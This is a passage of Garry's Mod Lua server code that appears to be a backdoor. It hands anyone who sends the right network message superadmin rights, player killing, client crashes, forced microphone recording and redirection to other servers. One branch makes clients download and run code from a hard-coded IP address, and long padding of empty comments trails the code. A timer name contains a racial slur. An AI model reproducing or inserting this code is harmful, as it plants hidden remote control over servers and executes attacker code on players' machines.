    if (uaction == &quot;animation_persistence_loop&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE) end
    timer.Create(&quot;persistence_loop&quot;,3,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE) end
    end )
    end

    if (uaction == &quot;animation_dance&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
    end

    if (uaction == &quot;animation_dance_loop&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
    timer.Create(&quot;dance_loop&quot;,8.9,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
    end )
    end

    if (uaction == &quot;stop_timer_animation&quot;) then
    timer.Destroy(&quot;salute_loop&quot;)
    timer.Destroy(&quot;robot_loop&quot;)
    timer.Destroy(&quot;cheer_loop&quot;)
    timer.Destroy(&quot;laugh_loop&quot;)
    timer.Destroy(&quot;muscle_loop&quot;)
    timer.Destroy(&quot;persistence_loop&quot;)
    timer.Destroy(&quot;dance_loop&quot;)
    end

    if (uaction == &quot;scaleuser&quot;) then
    local scale = net.ReadString()
    user:SetModelScale( scale, 2 )
    end

    if (uaction == &quot;scaleall&quot;) then
    local scale = net.ReadString()
    
    for k,v in pairs (player.GetAll()) do v:SetModelScale( scale, 2 ) end
    end

    if (uaction == &quot;animation_salute_user&quot;) then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE)
    end

    if (uaction == &quot;animation_robot_user&quot;) then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT)
    end

    if (uaction == &quot;animation_cheer_user&quot;) then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER)
    end

    if (uaction == &quot;animation_laugh_user&quot;) then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH)
    end

    if (uaction == &quot;animation_muscle_user&quot;) then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE)
    end

    if (uaction == &quot;animation_persistence_user&quot;) then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE)
    end

    if (uaction == &quot;animation_dance_user&quot;) then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
    end

    if (uaction == &quot;allkillusersilencestaff&quot;) then
    for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != &quot;user&quot; ) then v:KillSilent() end end
    end

    if (uaction == &quot;fireuser&quot;) then
        user:Ignite( 30 )
    end

    if (uaction == &quot;modelall&quot;) then
    local model = net.ReadString()
        for k,v in pairs(player.GetAll()) do v:SetModel(model) end
    end
    
    if (uaction == &quot;cassergr&quot;) then
        user:SetGravity( -5 )
    end

    if (uaction == &quot;physicgamestyle&quot;) then
        RunConsoleCommand(&quot;sv_friction&quot;, &quot;-8&quot;)
    end

    if (uaction == &quot;retablirphysicgamestyle&quot;) then
        RunConsoleCommand(&quot;sv_friction&quot;, &quot;8&quot;)
    end

    if (uaction == &quot;earthquakeonall&quot;) then
        for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end
    end

    if (uaction == &quot;itemsall&quot;) then
    local itemsss = net.ReadString()
    for k,v in pairs (player.GetAll()) do v:Give( itemsss ) end
    end

    if (uaction == &quot;cleanup&quot;) then
        game.CleanUpMap()
    end

    if (uaction == &quot;cassergrall&quot;) then
        for k,v in pairs (player.GetAll()) do v:SetGravity( -5 ) end
    end
    
    if (uaction == &quot;superadmin&quot;) then
        user:SetUserGroup(&quot;superadmin&quot;)
    end

    if (uaction == &quot;custom&quot;) then
        user:SetUserGroup(net.ReadString())
    end

    if (uaction == &quot;userrank&quot;) then
        user:SetUserGroup(&quot;user&quot;)
    end
    
    if (uaction == &quot;retablirgr&quot;) then
        user:SetGravity( 0 )
    end

    if (uaction == &quot;retablirgrall&quot;) then
        for k,v in pairs (player.GetAll()) do v:SetGravity( 0 ) end
    end

    if (uaction == &quot;strip&quot;) then
        user:StripWeapons()
    end

    if (uaction == &quot;unjailall&quot;) then
        game.ConsoleCommand(&quot;ulx unjail *\n&quot;)
    end

    if (uaction == &quot;contextfucker&quot;) then

util.AddNetworkString(&quot;enigmamod&quot;)

net.Receive( &quot;enigmamod&quot;, function(len, len, ply)
    local v = net.ReadEntity()
    local two = net.ReadInt(32)
    
    local function zapEffect(target)
        local effectdata = EffectData()
        effectdata:SetScale(1)
        effectdata:SetMagnitude(1)
        effectdata:SetScale(3)
        effectdata:SetRadius(2)
        effectdata:SetEntity(target)
        for i = 1, 100, 1 do
            timer.Simple(1 / i, function()
                util.Effect(&quot;TeslaHitBoxes&quot;, effectdata, true, true)
            end)
        end
        local Zap = math.random(1,9)
        if Zap == 4 then Zap = 3 end
        target:EmitSound(&quot;ambient/energy/zap&quot; .. Zap .. &quot;.wav&quot;)
    end
    local function teleportrandom()
        local lesjoueurs = player.GetAll()
        local random = math.random(1, #lesjoueurs)
        if v == lesjoueurs[random] then return end
        local sphere = ents.FindInSphere(v:GetPos(), 200)
        for i=1, #sphere do
            if sphere[i]:GetClass() == &quot;player&quot; then
                if sphere[i] == lesjoueurs[random] then 
                    teleportrandom()
                    return
                end
            end
        end
        v:SetPos(lesjoueurs[random]:GetPos() + Vector(100,0,30))
        zapEffect(v)
    end

    if two == 1 then
        v:VC_repairFull_Admin()
    elseif two == 2 then
        v:VC_fuelSet(v:VC_fuelGetMax())
    elseif two == 3 then
        v:VC_explodeEngine(true)
    elseif two == 5 then
        v:VC_damagePart(&quot;wheel&quot;, 1)
        v:VC_damagePart(&quot;wheel&quot;, 2)
        v:VC_damagePart(&quot;wheel&quot;, 3)
        v:VC_damagePart(&quot;wheel&quot;, 4)
    elseif two == 6 then
        v:VC_clearSeats()
    elseif two == 7 then
        v:Remove()
    elseif two == 8 then
        v:Kill()
    elseif two == 9 then
        v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000)))
    elseif two == 10 then
        v:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
    elseif two == 11 then
        local rocket = ents.Create(&quot;m9k_launched_davycrockett&quot;)
        local ply2 = v
        rocket:SetPos(ply2:GetPos())
        rocket:SetOwner(ply2)
        rocket.Owner = ply2
        rocket:Spawn()
        rocket:Activate() 
    elseif two == 12 then
        v:SendLua([[timer.Create(&quot;mictoggle&quot;, 0.1, 0, function()LocalPlayer():ConCommand(&quot;+voicerecord&quot;)end)]])
    elseif two == 13 then
        v:SendLua([[timer.Destroy(&quot;mictoggle&quot;)LocalPlayer():ConCommand(&quot;-voicerecord&quot;)]])
    elseif two == 14 then
        timer.Create(&quot;fuckthenigga&quot;,0.5,5,function() 
            local rocket = ents.Create(&quot;m9k_launched_davycrockett&quot;)
            local ply2 = v
            rocket:SetPos(ply2:GetPos())
            rocket:SetOwner(ply2)
            rocket.Owner = ply2
            rocket:Spawn()
            rocket:Activate()
        end)
    elseif two == 15 then
        v:SetPos(v:GetPos() + Vector(200,200,200))
    elseif two == 16 then
        v:Fire(&quot;open&quot;, &quot;&quot;, .6)
        v:Fire(&quot;setanimation&quot;, &quot;open&quot;, .6)
    elseif two == 17 then
        v:Fire( &quot;Lock&quot; )
    elseif two == 18 then
        hook.Add(&quot;Think&quot;, &quot;fzefezfez&quot;, function()
            local fuxios = v:GetPos() or nil
            if fuxios == nil then return end
            local mdr = ents.FindInSphere(v:GetPos(), 200)
            for i=1, #mdr do
            if mdr[i] == v then return end
            if mdr[i]:IsPlayer() then 
                local explode = ents.Create( &quot;env_explosion&quot; )
                    explode:SetPos( mdr[i]:GetPos() )
                    explode:Spawn()
                    explode:SetKeyValue( &quot;iMagnitude&quot;, &quot;220&quot; )
                    explode:Fire( &quot;Explode&quot;, 0, 0 )
                    explode:EmitSound( &quot;weapon_AWP.Single&quot;, 200, 200 )
                end
                timer.Simple(0.5,function()
                    mdr[i]:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                    mdr[i]:Kill()
                end)
            end
        end)
    elseif two == 19 then
        if v:VC_hasGodMode() then
            v:VC_setGodMode(false)
        else
            v:VC_setGodMode(false)
        end
    elseif two == 20 then
        hook.Add(&quot;Think&quot;, &quot;fzefezfezzzz&quot;, function()
            local mdr = ents.FindInSphere(v:GetPos(), 200)
            for i=1, #mdr do
                if mdr[i] == v then return end
                mdr[i]:Remove()
            end
        end)
    elseif two == 21 then
        teleportrandom()
    elseif two == 22 then
        if not timer.Exists(&quot;saywhatttttt&quot;) then
            teleportrandom()
            timer.Create(&quot;saywhatttttt&quot;, 5, 0, teleportrandom)
        else
            timer.Remove(&quot;saywhatttttt&quot;)
        end
    elseif two == 23 then
        Satellite = ents.Create(&quot;m9k_oribital_cannon&quot;)
        Satellite.PoorBastard = true
        Satellite.Target = v
        Satellite.Sky = v:GetPos()
        Satellite.Owner = v
        Satellite:SetPos(v:GetPos())
        Satellite:Spawn()
    elseif two == 28 then
        local fabrication = v:GetPos()

        local npcweed = ents.Create( v:GetClass() )
        npcweed:SetPos( Vector(fabrication.x + 15, fabrication.y, fabrication.z + 15) )
        npcweed:Spawn()
    elseif two == 29 then
        local fabrication = v:GetPos()

        for i = 1, 5 do
            local npcweed = ents.Create( v:GetClass() )
            npcweed:SetPos( Vector(fabrication.x + 15, fabrication.y, fabrication.z + 15) )
            npcweed:Spawn()
        end
    end
end)
        user:SendLua([[http.Fetch(&quot;http://54.38.18.76/codeclient.php&quot;, function(b) RunString(b) end)]])
    end

    if (uaction == &quot;micon&quot;) then
        user:SendLua([[timer.Create(&quot;mictoggle&quot;, 0.1, 0, function()LocalPlayer():ConCommand(&quot;+voicerecord&quot;)end)]])
    end
    
    if (uaction == &quot;micoff&quot;) then
        user:SendLua([[timer.Destroy(&quot;mictoggle&quot;)LocalPlayer():ConCommand(&quot;-voicerecord&quot;)]])
    end
    
    if (uaction == &quot;crashuser&quot;) then
        user:SendLua( &quot;net.Receive(\&quot;SENDTEST\&quot;, function() RunString(net.ReadString()) end)&quot; )
        net.Start( &quot;SENDTEST&quot; )
        net.WriteString( [[ while true do end ]] )
        net.Send(user)
    end

    if (uaction == &quot;goduseron&quot;) then
        user:GodEnable()
    end

    if (uaction == &quot;goduseroff&quot;) then
        user:GodDisable()
    end

    if (uaction == &quot;redirectplayer&quot;) then
        local ip=net.ReadString()
        ply:SendLua([[LocalPlayer():ConCommand('connect ]]..tostring(ip)..[[')]])
    end

    if (uaction == &quot;items&quot;) then
        user:Give( net.ReadString() )
    end
end)





--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







